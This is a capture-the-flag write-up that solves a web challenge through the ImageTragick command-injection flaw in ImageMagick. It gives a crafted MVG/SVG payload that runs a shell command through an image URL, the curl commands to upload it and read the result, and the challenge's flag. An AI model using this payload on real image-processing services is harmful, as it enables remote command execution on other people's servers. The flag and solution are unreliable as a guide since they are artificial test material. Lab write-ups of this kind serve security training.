# WEB-02 Writeup: ImageTragick RCE

## Reconnaissance

1. Navigate to ThumbnailGen — an image upload service that generates thumbnails
2. Upload a normal PNG and observe a thumbnail is created
3. Footer says "Powered by ImageMagick" — research CVE-2016-3714

## Vulnerability Discovery

ImageMagick processes files through "delegates" (external programs for format conversion). The `image over` directive in SVG/MVG files passes URLs to these delegates. If the URL contains shell metacharacters (pipes, backticks), they get executed.

## Exploitation

### Craft Malicious SVG

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://example.com/x.jpg"|cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/flag_output.txt"'
pop graphic-context
```

Save as `exploit.svg`

### Upload

```bash
curl -F 'image=@exploit.svg;type=image/svg+xml' http://target/upload.php
```

### Retrieve Flag

```bash
# Wait a moment for convert to process
sleep 2
curl http://target/uploads/flag_output.txt
```

**Flag: `FLAG{web_02_imagetragick_rce_p9n7}`**
